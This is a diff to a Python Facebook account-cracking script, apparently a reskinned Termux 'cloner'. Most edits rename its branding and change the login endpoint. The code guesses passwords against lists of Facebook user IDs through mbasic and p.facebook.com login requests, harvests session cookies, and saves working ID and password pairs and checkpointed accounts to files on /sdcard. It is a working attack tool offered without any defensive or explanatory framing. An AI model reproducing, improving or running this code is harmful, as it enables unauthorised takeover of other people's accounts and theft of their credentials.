@@ -196,7 +196,7 @@ def menu():
 				print(logo)
 				
 				linex()
-				print(' Example : /sdcard/NOOB.txt')
+				print(' Example : /sdcard/PARI.txt')
 				linex()
 				file = input(' Put file path\033[1;37m: ')
 				try:
@@ -278,7 +278,7 @@ def menu():
 		
 def mmm(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.NOOB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.DANI\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -304,15 +304,15 @@ def mmm(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				
-				print('\033[1;92m[NOOB-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/NOOB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[Pari-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/Pari-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					
-					print('\33[1;31m[NOOB-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/NOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;31m[Jawad-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/jawad-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -844,7 +844,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': ua}
-			lo = session.post('https://mbasic.facebook.com/home.php?paipv=0&eav=Afap2_uJo9Q_g8JoU-mSAB3abE-hB6dRk92w4fiq1WuuopAsBCMPX41Yxzo3lLdr9NQ&_rdr',data=log_data,headers=header_freefb).text
+			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=400',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
